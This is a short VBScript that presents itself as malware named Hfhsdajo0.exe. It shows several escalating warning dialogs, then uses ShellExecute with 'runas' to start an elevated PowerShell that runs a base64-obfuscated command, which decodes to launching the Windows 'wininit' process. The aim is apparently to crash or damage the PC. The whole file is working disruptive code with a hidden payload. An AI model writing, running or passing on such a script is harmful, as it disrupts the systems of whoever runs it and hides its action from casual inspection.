Dim response

response = MsgBox("You are about to run a malware. Press No to not run.", vbYesNo + vbExclamation, "Hfhsdajo0.exe - Warning")
If response = vbYes Then
    MsgBox "This is the LAST warning. If you run it, it will HARM your computer.", vbExclamation, "Hfhsdajo0.exe - LAST warning"
    
    response = MsgBox("ARE you VERY sure you want to run it?", vbYesNo + vbExclamation, "Hfhsdajo0.exe - LATEST Warning")
    If response = vbYes Then
        MsgBox "Your computer is gonna be destroyed! Say goodbye to your PC!", vbCritical, "Hfhsdajo0.exe - FINAL Warning"

Set oShell = CreateObject("Shell.Application")
oShell.ShellExecute "powershell.exe"," $run = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('d2luaW5pdA==')); powershell $run", "", "runas", 1

    End If
End If